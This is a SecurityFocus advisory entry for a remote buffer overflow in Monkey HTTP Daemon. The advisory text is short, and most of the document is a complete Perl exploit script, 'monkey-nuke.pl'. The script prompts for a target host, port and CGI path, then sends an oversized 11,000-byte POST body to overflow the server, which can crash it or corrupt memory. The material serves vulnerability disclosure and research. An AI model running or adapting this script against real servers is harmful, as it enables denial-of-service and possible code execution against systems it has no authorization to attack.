source: http://www.securityfocus.com/bid/7202/info


Monkey HTTP Daemon is prone to a boundary condition error. This condition occurs when the server attempts to handle excessive HTTP POST data. Exploitation could allow a remote attacker to corrupt sensitive regions of memory with attacker-supplied values, resulting in code execution. Exploitation attempts may also result in a denial of service. 

#!/usr/bin/perl
# monkey-nuke.pl
# Monkey HTTPd Remote Buffer Overflow
# Discovery/Exploit by Matthew Murphy
use IO::Socket;
print STDOUT "What host to connect to \[\]\: ";
$host = trim(chomp($line = <STDIN>));
print STDOUT "What port to connect to \[80\]\: ";
$port = trim(chomp($line = <STDIN>));
$addr = "$host\:$port";
print STDOUT "What script to submit to \[\/cgi-bin\/test\.pl\]\: ";
$script = trim(chomp($line = <STDIN>));
$buffer = "A"x11000;
$exploit = "POST /$script HTTP/1.0\r\n";
$exploit.= "Content-Type: application/x-www-form-urlencoded\r\n";
$exploit.= "Content-Length: 11000\r\n\r\n";
$exploit.= "$buffer\r\n\r\n";
$f = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$addr);
print $f $exploit;
sleep 5;
undef $f;